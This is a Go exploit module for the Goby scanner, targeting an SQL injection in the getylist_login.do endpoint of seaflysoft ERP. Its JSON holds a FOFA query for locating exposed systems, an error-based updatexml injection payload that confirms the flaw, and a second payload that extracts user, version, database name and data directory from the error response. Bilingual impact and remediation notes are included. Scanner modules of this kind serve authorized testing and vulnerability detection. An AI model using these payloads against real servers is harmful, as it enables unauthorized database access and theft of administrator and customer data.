package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "seaflysoft ERP getylist_login.do SQL Injection",
    "Description": "<p>seaflysoft cloud platform one-stop overall solution provider, business covers wholesale, chain, retail industry ERP solutions, wms warehousing solutions, e-commerce, field work, mobile terminal (PDA, APP, small program) solutions. There is a SQL injection vulnerability in the system getylist_login.do, through which an attacker can obtain database permissions</p>",
    "Product": "seaflysoft",
    "Homepage": "http://www.seaflysoft.com/",
    "DisclosureDate": "2022-12-03",
    "Author": "1angx",
    "FofaQuery": "body=\"checkMacWaitingSecond\"",
    "GobyQuery": "body=\"checkMacWaitingSecond\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.seaflysoft.com/\">http://www.seaflysoft.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "select",
            "value": "user(),version(),database(),@@datadir",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/getylist_login.do",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": "accountname=test' and (updatexml(1,concat(0x7e,(select md5(1)),0x7e),1));--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "c4ca4238a0b923820dcc509a6f75849",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/getylist_login.do",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": "accountname=test' and (updatexml(1,concat(0x7e,(select {{{sql}}}),0x7e),1));--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|XPATH syntax error: &#39;~(?s)(.*)&#39;"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "海翔云平台 getylist_login.do SQL 注入漏洞",
            "Product": "海翔云平台",
            "Description": "<p>海翔云平台一站式整体解决方案提供商，业务涵盖 批发、连锁、零售行业ERP解决方案、wms仓储解决方案、电商、外勤、移动终端（PDA、APP、小程序）解决方案。该系统getylist_login.do存在SQL注入漏洞，攻击者可通过该漏洞获取数据库权限<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.seaflysoft.com/\">http://www.seaflysoft.com/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "seaflysoft ERP getylist_login.do SQL Injection",
            "Product": "seaflysoft",
            "Description": "<p>seaflysoft cloud platform one-stop overall solution provider, business covers wholesale, chain, retail industry ERP solutions, wms warehousing solutions, e-commerce, field work, mobile terminal (PDA, APP, small program) solutions. There is a SQL injection vulnerability in the system getylist_login.do, through which an attacker can obtain database permissions<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.seaflysoft.com/\">http://www.seaflysoft.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10774"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}